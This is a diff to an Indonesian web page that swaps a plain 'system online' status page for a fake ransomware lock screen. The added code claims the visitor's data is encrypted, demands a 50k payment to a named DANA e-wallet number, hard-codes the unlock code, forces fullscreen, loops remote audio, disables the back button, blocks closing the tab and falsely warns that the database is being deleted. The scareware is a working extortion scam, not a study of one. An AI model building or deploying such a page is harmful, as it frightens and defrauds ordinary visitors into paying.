@@ -2,17 +2,33 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unzz Project - Normal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FATAL_ERROR_SYSTEM_LOCKED</title>
     <style>
-        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .status { color: #0f0; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .box { border: 2px solid #f00; padding: 25px; background: rgba(255, 0, 0, 0.1); width: 85%; text-align: center; box-shadow: 0 0 25px #f00; z-index: 1; border-radius: 12px; }
+        .alert { font-size: 1.5rem; font-weight: bold; color: #f00; animation: pulse 0.5s infinite; text-transform: uppercase; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        .text { margin: 15px 0; font-size: 0.8rem; color: #fff; line-height: 1.4; }
+        input { background: #111; border: 1px solid #f00; color: #0f0; padding: 12px; width: 85%; margin-top: 10px; text-align: center; font-weight: bold; outline: none; }
+        button { background: #f00; color: #fff; border: none; padding: 15px; margin-top: 20px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
-<body>
-    <h1>SYSTEM STATUS</h1>
-    <p class="status">[ ONLINE & NORMAL ]</p>
-    <p>Aplikasi sensix sudah kembali ke pengaturan awal.</p>
+<body onclick="startChaos()">
+
+    <div class="box">
+        <div class="alert">System Encrypted</div>
+        <div class="text">
+            Seluruh data anda telah dikunci oleh <b>SUXANOX</b>.<br>
+            Kirim 50k ke <b>DANA: 082235350022</b><br>
+            Klik ikon chat di pojok bawah untuk mendapatkan kode.
+        </div>
+        
+        <input type="text" id="pass" placeholder="MASUKKAN KODE DEKRIPSI...">
+        <button onclick="unlock()">DECRYPT NOW</button>
+    </div>
+
+    <audio id="sound" src="https://www.dropbox.com/scl/fi/7av51xfuxvb4n1c65k81c/ssstik.io_1778657493716.mp3?rlkey=dy3tqauqyi26ja8qj0wie8b4l&st=7a8fyq7p&dl=1" loop></audio>
 
     <script type="text/javascript">
     var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
@@ -24,6 +40,34 @@
     s1.setAttribute('crossorigin','*');
     s0.parentNode.insertBefore(s1,s0);
     })();
+    </script>
+
+    <script>
+        function startChaos() {
+            // Muter suara otomatis
+            document.getElementById('sound').play().catch(() => {});
+            // Paksa Fullscreen
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            // Anti-Back (Tombol kembali jadi nggak fungsi)
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => history.go(1);
+        }
+
+        function unlock() {
+            var code = document.getElementById('pass').value;
+            if (code === "unzzganteng") {
+                document.getElementById('sound').pause();
+                document.body.innerHTML = "<h1 style='color:#0f0; text-align:center;'>DECRYPTION SUCCESS!</h1>";
+                if (document.exitFullscreen) document.exitFullscreen().catch(() => {});
+            } else {
+                alert("KODE SALAH! MENGHAPUS DATABASE...");
+            }
+        }
+
+        // Biar muncul peringatan pas mau tutup browser
+        window.onbeforeunload = function() {
+            return "DATA SEDANG DIKUNCI!";
+        };
     </script>
 </body>
 </html>
